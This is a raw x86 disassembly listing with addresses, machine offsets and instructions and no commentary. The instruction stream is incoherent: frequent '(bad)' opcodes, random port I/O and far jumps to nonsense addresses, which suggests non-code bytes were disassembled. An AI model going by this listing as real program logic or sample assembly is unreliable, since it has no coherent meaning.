  40ba6f:	ret    0xdfeb
  40ba72:	jl     0x40bad4
  40ba74:	add    BYTE PTR [esi-0x1e93a668],cl
  40ba7a:	popf   
  40ba7b:	rol    DWORD PTR [ebp-0x1b2c7a2a],0xb3
  40ba82:	xor    DWORD PTR [edx],edi
  40ba84:	fbstp  TBYTE PTR [ebp+0x6c]
  40ba87:	in     eax,dx
  40ba88:	(bad)  
  40ba89:	add    DWORD PTR [eax-0x6442706a],ebx
  40ba8f:	sub    BYTE PTR [esi+ebx*2],0xdb
  40ba93:	(bad)  
  40ba94:	mov    dh,0x6d
  40ba96:	inc    edx
  40ba97:	test   eax,0xe7322cf5
  40ba9c:	test   ebp,ecx
  40ba9e:	push   0xb6170b8c
  40baa3:	(bad)  
  40baa4:	jl     0x40ba45
  40baa6:	xor    al,0x1a
  40baa8:	and    BYTE PTR [edx],0xc4
  40baab:	push   eax
  40baac:	test   eax,0xb8dbf20
  40bab1:	retf   
  40bab2:	add    ah,dl
  40bab4:	dec    edi
  40bab5:	jl     0x40bace
  40bab7:	pop    edx
  40bab8:	data16 jo 0x40bb1d
  40babb:	xchg   ebx,eax
  40babc:	nop
  40babd:	popa   
  40babe:	popa   
  40babf:	imul   ebp,DWORD PTR [ebx-0x11],0x67a7bc32
  40bac6:	or     DWORD PTR cs:[edi+0x75a3631b],edx
  40bacd:	dec    esi
  40bace:	jae    0x40bb2b
  40bad0:	push   es
  40bad1:	stc    
  40bad2:	aas    
  40bad3:	lods   eax,DWORD PTR ds:[esi]
  40bad4:	gs or  ebx,esp
  40bad7:	fisubr DWORD PTR [ebp-0x67]
  40bada:	mov    eax,ds:0x29024abc
  40badf:	and    al,0x33
  40bae1:	push   es
  40bae2:	in     al,dx
  40bae3:	mov    al,0xdd
  40bae5:	push   ss
  40bae6:	sbb    ah,BYTE PTR [esi+0x7c]
  40bae9:	sub    al,cl
  40baeb:	aad    0xb1
  40baed:	repnz cld 
  40baef:	ins    DWORD PTR es:[edi],dx
  40baf0:	mov    ebx,0x3d871035
  40baf5:	push   eax
  40baf6:	ins    BYTE PTR es:[edi],dx
  40baf7:	mov    ah,0x1a
  40baf9:	lods   al,BYTE PTR ds:[esi]
  40bafa:	pop    edi
  40bafb:	mov    dh,0x5b
  40bafd:	fld    TBYTE PTR [esi+0x32]
  40bb00:	pushf  
  40bb01:	ins    DWORD PTR es:[edi],dx
  40bb02:	jmp    0xa79fc9cc
  40bb07:	sub    BYTE PTR [edi],0xc
  40bb0a:	in     eax,dx
  40bb0b:	mov    dh,0x95
  40bb0d:	xchg   esi,eax
  40bb0e:	das    
  40bb0f:	sub    ebx,DWORD PTR [eax-0x54107350]
  40bb15:	xchg   edx,eax
  40bb16:	sub    DWORD PTR [ebp+0x6c],ebp
  40bb19:	mov    ah,0x8d
  40bb1b:	mov    ecx,0x6ece9f0
  40bb20:	jge    0x40bb37
  40bb22:	ins    DWORD PTR es:[edi],dx
  40bb23:	pusha  
  40bb24:	mov    ebx,0x6502b5b0
  40bb29:	fild   WORD PTR [edi+0x1f]
  40bb2c:	inc    edx
  40bb2d:	cmp    esp,DWORD PTR [eax]
  40bb2f:	cmp    bl,bl
  40bb31:	mov    dh,0x5b
  40bb33:	(bad)  [edi+0x36aa2fd5]
  40bb39:	inc    ecx
  40bb3a:	or     dl,BYTE PTR [ebp+0x1fc85071]
  40bb40:	mov    ebx,DWORD PTR [ebx+0x26]
  40bb43:	mov    ah,0xfe
  40bb45:	aas    
  40bb46:	icebp  
  40bb47:	add    BYTE PTR [ebp-0x60],bl
  40bb4a:	add    BYTE PTR [ebx],bl
  40bb4c:	loopne 0x40bb28
  40bb4e:	cli    
  40bb4f:	(bad)  
  40bb50:	mov    esi,0x89f790
  40bb55:	ja     0x40bb73
  40bb57:	(bad)  
  40bb58:	div    DWORD PTR [edx-0x5f493d2f]
  40bb5e:	xchg   ecx,eax
  40bb5f:	fisttp QWORD PTR [edi]
  40bb61:	ins    DWORD PTR es:[edi],dx
  40bb62:	sub    eax,0x5918f07f
  40bb67:	jmp    0x3f3f:0x2250ef36
  40bb6e:	mov    ?,WORD PTR [eax]
  40bb70:	inc    ebx
  40bb71:	cs cmp al,0xdf
  40bb74:	lahf   
  40bb75:	and    eax,DWORD PTR [eax]
  40bb77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb78:	add    edx,DWORD PTR [ecx-0x6e398b81]
  40bb7e:	lea    ebp,[esi]
  40bb80:	ins    BYTE PTR es:[edi],dx
  40bb81:	sahf   
  40bb82:	sub    esp,DWORD PTR [esi+0x587f7b4a]
  40bb88:	lea    ebp,[esi*4+0x5399e6d]
  40bb8f:	and    edi,DWORD PTR [edi]
  40bb91:	adc    dh,bh
  40bb93:	sbb    ecx,DWORD PTR [ebx]
  40bb95:	and    ebx,DWORD PTR [ebx]
  40bb97:	ffreep st(0)
  40bb99:	jo     0x40bbcc
  40bb9b:	xchg   ebx,eax
  40bb9c:	lahf   
  40bb9d:	sub    dl,dh
  40bb9f:	sbb    BYTE PTR [esi+ebx*4+0x76],bl
  40bba3:	ret    0x30b9
  40bba6:	mov    edi,0x5bcf00f6
  40bbab:	fs jmp 0x40bb76
  40bbae:	pop    eax
  40bbaf:	sbb    bh,BYTE PTR [ecx+0x6965761f]
  40bbb5:	lock add BYTE PTR [ebx],cl
  40bbb8:	mov    ah,0x6e
  40bbba:	xlat   BYTE PTR ds:[ebx]
  40bbbb:	dec    eax
  40bbbc:	adc    BYTE PTR [edi],bl
  40bbbe:	or     bh,BYTE PTR [ebx+0x34b1b1b4]
  40bbc4:	and    al,0x15
  40bbc6:	repnz add BYTE PTR [edi-0x32],bh
  40bbca:	inc    esp
  40bbcb:	out    dx,eax
  40bbcc:	mov    edi,0xedc3fcfb
  40bbd1:	jmp    0x40bb8f
  40bbd3:	nop
  40bbd4:	mov    al,ds:0x9364df
  40bbd9:	dec    ecx
  40bbda:	cwde   
  40bbdb:	arpl   bx,bx
  40bbdd:	jecxz  0x40bb94
  40bbdf:	pop    ebx
  40bbe0:	lea    ebx,[ebx+0x4a]
  40bbe3:	jmp    0x7a98d1be
  40bbe8:	ret    
  40bbe9:	pop    ss
  40bbea:	mov    esi,DWORD PTR [esi+0x595fb2fc]
  40bbf0:	jnp    0x40bb90
  40bbf2:	add    al,cl
  40bbf4:	xchg   edx,eax
  40bbf5:	jne    0x40bba7
  40bbf7:	(bad)  
  40bbf8:	fsubr  DWORD PTR [eax]
  40bbfa:	pop    ebp
  40bbfb:	sbb    BYTE PTR [edi-0x5d],cl
  40bbfe:	loopne 0x40bc13
  40bc00:	push   cs
  40bc01:	repz cmp al,0xb
  40bc04:	or     eax,0x1db55858
  40bc09:	xchg   edi,eax
  40bc0a:	retf   0x4651
  40bc0d:	adc    ecx,edi
  40bc0f:	into   
  40bc10:	inc    edx
  40bc11:	or     ebx,DWORD PTR [ebp+0x5f185f35]
  40bc17:	pusha  
  40bc18:	sbb    dh,BYTE PTR [edi+0x294a1b6d]
  40bc1e:	lods   al,BYTE PTR ds:[esi]
  40bc1f:	mov    dh,0xa6
  40bc21:	adc    ecx,esp
  40bc23:	and    DWORD PTR [edx],ebp
  40bc25:	mov    dh,0xbe
  40bc27:	cs sbb edi,ebx
  40bc2a:	mov    edi,0x937f6c19
  40bc2f:	test   DWORD PTR [esp+edi*1-0x6ee927a3],edx
  40bc36:	mov    bh,0xc5
  40bc38:	push   esp
  40bc39:	pop    eax
  40bc3a:	or     dl,al
  40bc3c:	mov    edi,0x91b70fe4
  40bc41:	(bad)  
  40bc42:	daa    
  40bc43:	in     eax,0x0
  40bc45:	sub    al,0x65
  40bc47:	xchg   ebp,eax
  40bc48:	sbb    al,0x45
  40bc4a:	pop    ds
  40bc4b:	adc    esp,DWORD PTR [ecx+ecx*4+0x7]
  40bc4f:	cs xchg esi,eax
  40bc51:	cmp    bl,BYTE PTR [edi-0x521fe027]
  40bc57:	fstp   QWORD PTR [esi]
  40bc59:	je     0x40bc92
  40bc5b:	add    edi,DWORD PTR [edi-0x5f]
  40bc5e:	shl    BYTE PTR [eax+0x2c],0x47
  40bc62:	sbb    BYTE PTR [ecx-0x42],bl
  40bc65:	les    edx,FWORD PTR [edi]
  40bc67:	mov    bl,0x1f
  40bc69:	lds    eax,FWORD PTR [eax]
  40bc6b:	xchg   edx,eax
  40bc6c:	(bad)  
  40bc6e:	adc    al,0x18
  40bc70:	fldcw  WORD PTR [edx+0x59]
  40bc73:	fistp  QWORD PTR [eax+0x8a5bfad]
  40bc79:	xchg   edi,eax
  40bc7a:	ss rcl esi,cl
  40bc7d:	(bad)  
  40bc7e:	dec    BYTE PTR [eax+0x56cd745f]
  40bc84:	dec    eax
  40bc85:	in     eax,dx
  40bc86:	rol    esi,0xc8
  40bc89:	push   es
  40bc8a:	pop    edi
  40bc8b:	jns    0x40bc55
  40bc8d:	sbb    eax,DWORD PTR [ebp-0x1e]
  40bc90:	ret    0x10d6
  40bc93:	cmp    eax,0x370d74e3
  40bc98:	js     0x40bcc7
  40bc9a:	sbb    eax,0x1f591e59
  40bc9f:	test   al,0x88
  40bca1:	add    BYTE PTR [ecx],al
  40bca3:	test   al,0x94
  40bca5:	adc    al,dh
  40bca7:	ret    0xb6a5
  40bcaa:	pop    edi
  40bcab:	mov    al,BYTE PTR ds:0x7daf8a1
  40bcb1:	jb     0x40bc52
  40bcb3:	mov    dh,0x95
  40bcb5:	(bad)  
  40bcb7:	jmp    0xd254:0xc4c95f
  40bcbe:	outs   dx,BYTE PTR ds:[esi]
  40bcbf:	or     eax,0xed04f6e0
  40bcc5:	mov    cl,0x75
  40bcc7:	cmc    
  40bcc8:	pop    edi
  40bcc9:	and    al,0x6b
  40bccb:	cdq    
  40bccc:	sbb    dh,BYTE PTR [esi+0x6656e293]
  40bcd2:	dec    edx
  40bcd3:	stc    
  40bcd4:	lock fbld TBYTE PTR [ecx+0x6db6c771]
  40bcdb:	iret   
  40bcdc:	or     eax,0xf978cbf
  40bce1:	or     ebx,eax
  40bce3:	pop    ss
  40bce4:	fistp  QWORD PTR [edi-0x372e41a4]
  40bcea:	sbb    al,0xdc
  40bcec:	fbld   TBYTE PTR [ecx+0x62d10048]
  40bcf2:	xchg   BYTE PTR [ebp-0x3b0f4493],al
  40bcf8:	fs mov ecx,0x92e7594c
  40bcfe:	or     edi,esi
  40bd00:	mov    al,ds:0x34817963
  40bd05:	aas    
  40bd06:	adc    BYTE PTR [eax],al
  40bd08:	ins    BYTE PTR es:[edi],dx
  40bd09:	pop    esp
  40bd0a:	inc    DWORD PTR [ebx]
  40bd0c:	dec    ebp
  40bd0d:	pop    ebx
  40bd0e:	sbb    ebx,DWORD PTR [ecx+0x3f]
  40bd11:	enter  0x1d4b,0x41
  40bd15:	mov    WORD PTR [edi-0x40],ds
  40bd18:	in     al,0x65
  40bd1a:	jmp    0x40bd3c
  40bd1c:	cmp    al,0x4
  40bd1e:	jg     0x40bd33
  40bd20:	mov    al,ds:0x91f24900
  40bd25:	sbb    edi,DWORD PTR [eax]
  40bd27:	xor    BYTE PTR [edi+0x742008e],bl
  40bd2d:	add    eax,0x8c6e0800
  40bd32:	fcomp  QWORD PTR [eax+edi*8]
  40bd35:	jl     0x40bd37
  40bd37:	add    eax,DWORD PTR [edi+0x3f]
  40bd3a:	or     al,0x17
  40bd3c:	shl    BYTE PTR [esi+0x69],0x7b
  40bd40:	(bad)  
  40bd41:	sbb    eax,0xcd5f2938
  40bd46:	shl    DWORD PTR [eax-0x705a3c3],1
  40bd4c:	xor    BYTE PTR [edi+edi*1],dh
  40bd4f:	lahf   
  40bd50:	push   edi
  40bd51:	inc    edi
  40bd52:	jo     0x40bcfc
  40bd54:	jg     0x40bd0a
  40bd56:	enter  0x8df2,0x66
  40bd5a:	fistp  WORD PTR [edi]
  40bd5c:	sbb    esp,edx
  40bd5e:	add    BYTE PTR [edi],bh
  40bd60:	and    al,0x83
  40bd62:	or     esp,DWORD PTR [ebp-0x1d]
  40bd65:	jecxz  0x40bd7e
  40bd67:	cmp    DWORD PTR [esi],ecx
  40bd69:	(bad)  
  40bd6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd6c:	push   0x6d1b52c8
  40bd71:	push   es
  40bd72:	fimul  DWORD PTR [eax-0x29]
  40bd75:	lahf   
  40bd76:	clc    
  40bd77:	jmp    0x2003a6e5
  40bd7c:	popa   
  40bd7d:	shl    BYTE PTR [ebp-0x4040e7aa],0x2c
  40bd84:	and    eax,0x5d76b6dc
  40bd89:	mov    dl,0x80
  40bd8b:	inc    ecx
  40bd8c:	js     0x40bd93
  40bd8e:	xlat   BYTE PTR ds:[ebx]
  40bd8f:	dec    edx
  40bd90:	(bad)  
  40bd92:	sub    BYTE PTR [ecx+edi*8],bl
  40bd95:	stc    
  40bd96:	mov    ebp,0xebfee800
  40bd9b:	pop    ds
  40bd9c:	sub    DWORD PTR [esi],0xdada16bb
  40bda2:	mov    dh,0x5f
  40bda4:	mov    WORD PTR [ebp+ecx*2+0xb],es
  40bda8:	outs   dx,BYTE PTR ds:[esi]
  40bda9:	or     BYTE PTR [esi+edx*8+0x171fadb6],cl
  40bdb0:	sar    DWORD PTR [ecx-0x68],0x9f
  40bdb4:	inc    ebx
  40bdb5:	sti    
  40bdb6:	out    dx,al
  40bdb7:	in     al,dx
  40bdb8:	sahf   
  40bdb9:	adc    BYTE PTR [ebp-0x73],ch
  40bdbc:	lock fistp DWORD PTR [ecx-0x6]
  40bdc0:	pop    edi
  40bdc1:	test   DWORD PTR fs:[edi],ebx
  40bdc4:	mov    bh,0x28
  40bdc6:	fs (bad) 
  40bdc8:	lods   eax,DWORD PTR ds:[esi]
  40bdc9:	jo     0x40bd74
  40bdcb:	cwde   
  40bdcc:	push   esi
  40bdcd:	mov    ecx,0xcce0a32
  40bdd2:	lods   al,BYTE PTR ds:[esi]
  40bdd3:	aas    
  40bdd4:	in     eax,0xe4
  40bdd6:	loope  0x40bd9a
  40bdd8:	imul   ebx,DWORD PTR [edi],0xffffffd5
  40bddb:	mov    BYTE PTR [edi-0x2f],bh
  40bdde:	mov    ds:0x9e96da17,eax
  40bde3:	ins    BYTE PTR es:[edi],dx
  40bde4:	jnp    0x40bd7e
  40bde6:	push   ecx
  40bde7:	mov    ecx,esi
  40bde9:	pop    edi
  40bdea:	je     0x40be50
  40bdec:	xor    dl,BYTE PTR [eax]
  40bdee:	pop    ecx
  40bdef:	ds in  al,0xe3
  40bdf2:	je     0x40bd93
  40bdf4:	lea    edx,[ecx+0x6c10d89b]
  40bdfa:	pop    ds
  40bdfb:	in     al,dx
  40bdfc:	add    BYTE PTR [ebx+0x36],dh
  40bdff:	daa    
  40be00:	popa   
  40be01:	popa   
  40be02:	or     DWORD PTR fs:[edi-0x61],0x500d7f14
  40be0a:	pop    ds
  40be0b:	ins    BYTE PTR es:[edi],dx
  40be0c:	popa   
  40be0d:	(bad)  
  40be0e:	sbb    al,0x0
  40be10:	adc    eax,0x64007887
  40be15:	aas    
  40be16:	pushf  
  40be17:	sub    al,0x55
  40be19:	mov    WORD PTR cs:[edi+ebx*1+0x21],ds
  40be1e:	cld    
  40be1f:	aas    
  40be20:	jl     0x40be68
  40be22:	loopne 0x40bdda
  40be24:	lea    ebx,[edi+0x71bf4877]
  40be2a:	mov    al,ds:0x91c46b9f
  40be2f:	lods   eax,DWORD PTR ds:[esi]
  40be30:	mov    esi,0xacbf0dc7
  40be35:	xor    ebp,esi
  40be37:	fld    TBYTE PTR [ebp-0x57]
  40be3a:	jae    0x40be8c
  40be3c:	pop    edi
  40be3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be3e:	ja     0x40be59
  40be40:	push   0x69aa8794
  40be45:	stc    
  40be46:	fsub   QWORD PTR [edx+0x2c84a16d]
  40be4c:	lahf   
  40be4d:	hlt    
  40be4e:	in     al,0x64
  40be50:	arpl   WORD PTR [esi],ax
  40be52:	pop    esp
  40be53:	pop    ebx
  40be54:	fs hlt 
  40be56:	pop    edi
  40be57:	sub    ebx,DWORD PTR [ecx]
  40be59:	call   DWORD PTR [edi+0xfe47c87]
  40be5f:	add    dl,dh
  40be61:	push   edi
  40be62:	aad    0x0
  40be64:	mov    eax,0x3cbbb4
  40be69:	mov    ecx,0xb1918589
  40be6e:	jecxz  0x40be74
  40be70:	dec    esp
  40be71:	pop    ds
  40be72:	outs   dx,BYTE PTR ds:[esi]
  40be73:	add    BYTE PTR [ecx+0x1c2dad8d],ch
  40be79:	scas   eax,DWORD PTR es:[edi]
  40be7a:	popf   
  40be7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be7c:	adc    BYTE PTR [edi+0x15a2d54a],bh
  40be82:	cs ins BYTE PTR es:[edi],dx
  40be84:	mov    ds,WORD PTR [eax-0x61]
  40be87:	mov    edi,0xeea3a6c1
  40be8c:	test   eax,0x2db8db6d
  40be91:	mov    edi,0x65f75029
  40be96:	pop    ebp
  40be97:	push   eax
  40be98:	retf   
  40be99:	out    0xe9,al
  40be9b:	test   BYTE PTR [edx-0x25],ch
  40be9e:	xchg   DWORD PTR [eax+0x1f],eax
  40bea1:	test   eax,0x9e5889f6
  40bea6:	pop    ds
  40bea7:	pop    edi
  40bea8:	cld    
  40bea9:	loop   0x40beeb
  40beab:	aas    
  40beac:	aas    
  40bead:	adc    al,0xc8
  40beaf:	xchg   esp,esp
  40beb1:	pusha  
  40beb2:	icebp  
  40beb3:	les    ecx,FWORD PTR [ecx-0x2fe02068]
  40beb9:	inc    DWORD PTR [ebp-0x26]
  40bebc:	jne    0x40be9e
  40bebe:	push   esp
  40bebf:	or     BYTE PTR [edi],bh
  40bec1:	pop    ds
  40bec2:	mov    WORD PTR [eax+0x5f],es
  40bec5:	inc    edx
  40bec6:	lods   al,BYTE PTR ds:[esi]
  40bec7:	and    esi,DWORD PTR [eax-0x6b603b9b]
  40becd:	dec    eax
  40bece:	pop    ds
  40becf:	fisttp WORD PTR [eax]
  40bed1:	inc    esp
  40bed2:	jp     0x40bef4
  40bed4:	aas    
  40bed5:	push   eax
  40bed6:	pop    edi
  40bed7:	lahf   
  40bed8:	sbb    BYTE PTR [eax],cl
  40beda:	xchg   edx,eax
  40bedb:	out    dx,eax
  40bedc:	cmp    al,0xf0
  40bede:	pop    edi
  40bedf:	or     al,0x74
  40bee1:	ins    DWORD PTR es:[edi],dx
  40bee2:	fcomp  QWORD PTR [eax+0x5a]
  40bee5:	fist   DWORD PTR [bx]
  40bee8:	jmp    0xe7db7c41
  40beed:	pushf  
  40beee:	cwde   
  40beef:	mov    dh,0xc2
  40bef1:	mov    dh,0x5
  40bef3:	add    ch,BYTE PTR [ebx-0x52]
  40bef6:	inc    esi
  40bef7:	or     ch,ch
  40bef9:	out    dx,eax
  40befa:	(bad)  [esi-0x3268d3d2]
  40bf00:	pop    esi
  40bf01:	mov    ds:0x23ca70d1,eax
  40bf06:	xchg   edi,eax
  40bf07:	imul   esp,DWORD PTR [ebp-0x7d],0x5b
  40bf0b:	popa   
  40bf0c:	xor    DWORD PTR [edi+0x44],edi
  40bf0f:	cwde   
  40bf10:	int    0x6e
  40bf12:	fadd   QWORD PTR [esi-0x17]
  40bf15:	mov    BYTE PTR [esi+0x31],0xa5
  40bf19:	leave  
  40bf1a:	xor    BYTE PTR [ebx-0x12f4f9e3],al
  40bf20:	mov    dl,0x79
  40bf23:	sar    esi,0xf9
  40bf26:	cmc    
  40bf27:	aam    0x7a
  40bf29:	cli    
  40bf2a:	retf   0x6dba
  40bf2d:	sbb    ebx,DWORD PTR [ebx-0xc]
  40bf30:	pop    edi
  40bf31:	xor    bh,bl
  40bf33:	add    eax,0x7b2c3e8d
  40bf38:	inc    ecx
  40bf39:	jecxz  0x40bf0d
  40bf3b:	push   esi
  40bf3c:	push   cs
  40bf3d:	cmp    DWORD PTR [ebx-0xe],0xffffffe8
  40bf41:	into   
  40bf42:	arpl   bp,dx
  40bf44:	mov    dh,0x5b
  40bf46:	mov    ebx,0x8f5e3eb0
  40bf4b:	outs   dx,BYTE PTR ds:[esi]
  40bf4c:	dec    esi
  40bf4d:	cdq    
  40bf4e:	mov    ecx,0xbb41c26b
  40bf53:	sub    eax,0x33735eb5
  40bf58:	in     eax,0xcf
  40bf5a:	lods   al,BYTE PTR ds:[esi]
  40bf5b:	mov    ch,0xb9
  40bf5d:	(bad)  
  40bf5e:	inc    eax
  40bf5f:	jmp    0x3b96311a
  40bf64:	jbe    0x40bef8
  40bf66:	add    dh,BYTE PTR [esi]
  40bf68:	mov    ds:0x8d89718f,al
  40bf6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf6e:	xor    eax,0x796645e1
  40bf73:	cli    
  40bf74:	pop    edi
  40bf75:	jmp    0x8aec2d4d
  40bf7a:	cmp    al,bl
  40bf7c:	push   ebx
  40bf7d:	loope  0x40bf92
  40bf7f:	add    cl,BYTE PTR [esi+eax*2]
  40bf82:	imul   esp,edx,0x16
  40bf85:	sbb    DWORD PTR [ebx+0x6e],0xffffffb9
  40bf89:	stc    
  40bf8a:	imul   ecx,DWORD PTR [edx+0x54],0x24
  40bf8e:	aam    0xb6
  40bf90:	ins    DWORD PTR es:[edi],dx
  40bf91:	fist   DWORD PTR [edi+eax*1-0x1a]
  40bf95:	cmc    
  40bf96:	or     edi,DWORD PTR [ecx+0x4d]
  40bf99:	xor    al,0x83
  40bf9b:	push   esi
  40bf9c:	jecxz  0x40bf60
  40bf9e:	mov    dh,0xa4
  40bfa0:	dec    esp
  40bfa1:	in     al,dx
  40bfa2:	mov    ebx,0xf9626e0a
  40bfa7:	pop    esi
  40bfa8:	ins    BYTE PTR es:[edi],dx
  40bfa9:	ins    BYTE PTR es:[edi],dx
  40bfaa:	in     eax,dx
  40bfab:	shl    BYTE PTR [ecx-0x6d572a7a],cl
  40bfb1:	and    BYTE PTR [eax+0x24],bh
  40bfb4:	inc    ecx
  40bfb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfb6:	ins    DWORD PTR es:[edi],dx
  40bfb7:	xor    ebp,DWORD PTR ds:0x8c3bb33a
  40bfbd:	pop    ebp
  40bfbe:	mov    bl,0xdd
  40bfc0:	jp     0x40bf67
  40bfc2:	lods   eax,DWORD PTR ds:[esi]
  40bfc3:	fstp   st(2)
  40bfc5:	cmp    DWORD PTR [eax+0x38],edx
  40bfc8:	xchg   edx,eax
  40bfc9:	retf   
  40bfca:	mov    bl,0xa4
  40bfcc:	dec    edx
  40bfcd:	cmp    al,0x5c
  40bfcf:	ss pop eax
  40bfd1:	mov    al,ds:0x6baaa8c1
  40bfd6:	push   edi
  40bfd7:	nop
  40bfd8:	jecxz  0x40bfd7
  40bfda:	lods   eax,DWORD PTR ds:[esi]
  40bfdb:	gs stos DWORD PTR es:[edi],eax
  40bfdd:	fstp   st(5)
  40bfdf:	cmp    BYTE PTR [edi],bl
  40bfe1:	ja     0x40bfe4
  40bfe3:	xchg   esp,eax
  40bfe4:	or     dl,BYTE PTR [eax]
  40bfe6:	ins    DWORD PTR es:[edi],dx
  40bfe7:	mov    eax,ds:0xc0cf9605
  40bfec:	leave  
  40bfed:	mov    al,0x2
  40bfef:	push   ds
  40bff0:	cmp    BYTE PTR [ebx-0x24],ch
  40bff3:	fcmovu st,st(2)
  40bff5:	xor    BYTE PTR [edx+0x2],0x11
  40bff9:	ror    BYTE PTR [esi-0x5e5aa6dc],0x81
  40c000:	scas   al,BYTE PTR es:[edi]
  40c001:	(bad)  
  40c002:	ins    DWORD PTR es:[edi],dx
  40c003:	sbb    edi,DWORD PTR [edi-0x1d9ba55d]
  40c009:	sbb    esi,eax
  40c00b:	pop    ss
  40c00c:	mov    dh,0x76
  40c00e:	jecxz  0x40bfbd
  40c010:	xchg   esi,eax
  40c011:	shr    DWORD PTR [eax+0x59],cl
  40c014:	xchg   ebp,eax
  40c015:	aam    0x85
  40c017:	add    al,0x66
  40c019:	test   al,0xdd
  40c01b:	fcomp  DWORD PTR [edx+0x5e]
  40c01e:	loopne 0x40c071
  40c020:	rol    BYTE PTR [ecx],0x2a
  40c023:	mov    dh,0xc2
  40c025:	ret    0xe6d6
  40c028:	push   0x4a
  40c02a:	ror    DWORD PTR [ebx+0x730667ca],cl
  40c030:	lea    ebp,[ebp-0x200e034a]
  40c036:	add    BYTE PTR [ebx],bh
  40c038:	inc    ebx
  40c039:	(bad)  
  40c03a:	jmp    0x95e68ee2
  40c03f:	outs   dx,DWORD PTR ds:[esi]
  40c040:	fisttp DWORD PTR [ebp+0x94dcf28]
  40c046:	loopne 0x40c08b
  40c048:	repnz outs dx,DWORD PTR ds:[esi]
  40c04a:	add    BYTE PTR [edx],al
  40c04c:	and    BYTE PTR [ebx],cl
  40c04e:	or     ebx,DWORD PTR [ebx+0x5b]
  40c051:	jecxz  0x40c058
  40c053:	fs push edx
  40c055:	xchg   edi,eax
  40c056:	outs   dx,DWORD PTR ds:[esi]
  40c057:	push   ss
  40c058:	fwait
  40c059:	mov    ecx,0x8f4b6db5
  40c05e:	shr    esp,1
  40c060:	sub    ecx,DWORD PTR [esi]
  40c062:	jo     0x40c055
  40c064:	stos   BYTE PTR es:[edi],al
  40c065:	and    DWORD PTR [ebp+0x41edb6df],esi
  40c06b:	pop    edi
  40c06c:	mov    dl,0x9e
  40c06e:	popa   
  40c06f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c070:	adc    al,0x41
  40c072:	add    BYTE PTR [esi+0x48],bh
  40c075:	je     0x40c053
  40c077:	inc    edx
  40c078:	arpl   WORD PTR [ebx+0x359e775c],di
  40c07e:	mov    esi,0xe6323112
  40c083:	pop    ebp
  40c084:	add    al,0x2c
  40c086:	fcom   QWORD PTR [eax-0x53]
  40c089:	sub    DWORD PTR [edi+0x4b7e7922],0x6d5ba54b
  40c093:	aas    
  40c094:	ds gs jp 0x40c0e4
  40c098:	sub    esp,eax
  40c09a:	outs   dx,BYTE PTR ds:[esi]
  40c09b:	dec    ebx
  40c09c:	pop    ebx
  40c09d:	adc    DWORD PTR [edx+0x6f],0x8844531a
  40c0a4:	push   ebx
  40c0a5:	adc    al,0x2e
  40c0a7:	inc    edi
  40c0a8:	push   ebp
  40c0a9:	pop    esp
  40c0aa:	fidivr WORD PTR [edi-0x14caff11]
  40c0b0:	push   esi
  40c0b1:	je     0x40c089
  40c0b3:	outs   dx,BYTE PTR ds:[esi]
  40c0b4:	dec    ebx
  40c0b5:	ins    DWORD PTR es:[edi],dx
  40c0b6:	push   edi
  40c0b7:	sub    al,0x71
  40c0b9:	cmp    eax,DWORD PTR [edx-0x5]
  40c0bc:	shl    DWORD PTR [edi],0x8
  40c0bf:	mov    dh,0x6c
  40c0c1:	fist   DWORD PTR [esi-0x25]
  40c0c4:	in     al,0x11
  40c0c6:	jmp    0xba5f:0xe8cb91d7
  40c0cd:	xchg   esi,eax
  40c0ce:	xchg   edi,eax
  40c0cf:	cs ins DWORD PTR es:[edi],dx
  40c0d1:	outs   dx,DWORD PTR ds:[esi]
  40c0d2:	or     eax,0x5953b94d
  40c0d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0d8:	add    BYTE PTR [ecx+0x5858d8f8],bl
  40c0de:	fiadd  DWORD PTR [esi+0x6747b3b8]
  40c0e4:	jg     0x40c116
  40c0e6:	mov    ebx,0x596dda36
  40c0eb:	les    esi,FWORD PTR [eax+eiz*1-0x31ab1517]
  40c0f2:	sbb    dh,bh
  40c0f4:	ins    DWORD PTR es:[edi],dx
  40c0f5:	pop    ss
  40c0f6:	mov    dh,0x2d
  40c0f8:	adc    eax,0xfaf9ef7a
  40c0fd:	test   DWORD PTR [edx],ebx
  40c0ff:	jno    0x40c145
  40c101:	test   eax,0x9e5f8965
  40c106:	push   eax
  40c107:	sub    bh,ch
  40c109:	cmp    al,0xc0
  40c10b:	and    al,0xa3
  40c10d:	jne    0x40c17a
  40c10f:	jmp    0x40c112
  40c111:	push   ss
  40c112:	loopne 0x40c184
  40c114:	aad    0xde
  40c116:	adc    BYTE PTR [ecx],ah
  40c118:	ins    DWORD PTR es:[edi],dx
  40c119:	mov    ecx,DWORD PTR [ebp+0x3bd25976]
  40c11f:	adc    eax,0x83822122
  40c124:	fld    TBYTE PTR [esi+0x50]
  40c127:	test   al,0xec
  40c129:	mov    ebx,0x1a739550
  40c12e:	push   ds
  40c12f:	fisubr DWORD PTR ds:0xbc5b6c4b
  40c135:	push   ecx
  40c136:	add    al,BYTE PTR ds:0xb55a9573
  40c13c:	test   ebx,ebx
  40c13e:	mov    dh,0x86
  40c140:	sahf   
  40c141:	xor    edi,0x44
  40c144:	xor    al,0x42
  40c146:	mov    al,ds:0x42c2a7ea
  40c14b:	fld    TBYTE PTR [esi+0x7c]
  40c14e:	push   ebp
  40c14f:	adc    BYTE PTR [ebx+ebx*2],0xb9
  40c153:	lods   al,BYTE PTR ds:[esi]
  40c154:	fdivr  QWORD PTR [eax-0x24912913]
  40c15a:	jmp    0xcd7c5621
  40c15f:	in     al,dx
  40c160:	je     0x40c0f4
  40c162:	xor    eax,0xdb12b6b9
  40c167:	inc    esi
  40c168:	sbb    esi,esi
  40c16a:	push   0x65c21f
  40c16f:	sub    al,dl
  40c171:	mov    edx,0x81a2c5b0
  40c176:	lds    ebp,FWORD PTR [eax]
  40c178:	rcl    BYTE PTR [edi-0x5d],1
  40c17b:	or     edx,DWORD PTR [edi-0x29774e33]
  40c181:	mov    ebp,0x377d15e6
  40c186:	mov    ebx,0xadb6dc0d
  40c18b:	ins    DWORD PTR es:[edi],dx
  40c18c:	pop    esp
  40c18d:	xchg   esp,eax
  40c18e:	sbb    eax,0x55d7ae32
  40c193:	add    bh,bh
